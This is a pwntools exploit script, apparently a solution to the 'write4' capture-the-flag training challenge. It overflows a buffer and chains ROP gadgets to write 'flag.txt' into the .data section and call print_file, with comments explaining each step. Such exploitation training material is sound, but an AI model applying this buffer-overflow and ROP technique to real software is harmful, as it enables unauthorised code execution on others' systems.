from pwn import *

context.log_level = "debug"
context.terminal = ["wezterm", "start", "--"]

bin = "./write4"
p = process(bin)
gdb.attach(p, api=True)
e = ELF(bin)
rop = ROP(e)

"""
1. Load the writable `.data` address into `r14` and the string `"flag.txt"` into
   `r15` with the gadget `pop r14; pop r15; ret`.
2. Store the string by invoking the `mov qword ptr [r14], r15; ret` gadget.
3. Use `pop rdi; ret` to move the `.data` address into `rdi`, the first‑argument 
   register.
4. Call `print_file()`.
"""

# 0x0000000000400690 : pop r14 ; pop r15 ; ret
pop_r14_r15_ret_addr = rop.find_gadget(["pop r14", "pop r15", "ret"]).address
# 0x0000000000400628 : mov qword ptr [r14], r15 ; ret
# NOTE: `pwntools` can only find simple gadgets, see:
# <https://github.com/Gallopsled/pwntools/issues/1492>. So, we instead hardcode
mov_r14_r15_ret_addr = 0x0000000000400628
# 0x0000000000400693 : pop rdi ; ret
pop_rdi_ret_addr = rop.find_gadget(["pop rdi", "ret"]).address

# For stack alignment
ret_addr = rop.find_gadget(["ret"]).address

# The `sh_addr` is a standard field in an ELF section header.
# It's the virtual address of the section at runtime.
data_section_addr = e.get_section_by_name(".data").header.sh_addr

print_file_plt = e.plt["print_file"]

flag_str = b"flag.txt"

payload = b"A" * 32
payload += b"B" * 8
payload += p64(pop_r14_r15_ret_addr)
payload += p64(data_section_addr)  # r14
payload += p64(u64(flag_str))  # r15
payload += p64(mov_r14_r15_ret_addr)
payload += p64(pop_rdi_ret_addr)
payload += p64(data_section_addr)
payload += p64(ret_addr)  # Stack alignment
payload += p64(print_file_plt)

p.sendafter(b"> ", payload)
p.recvall()
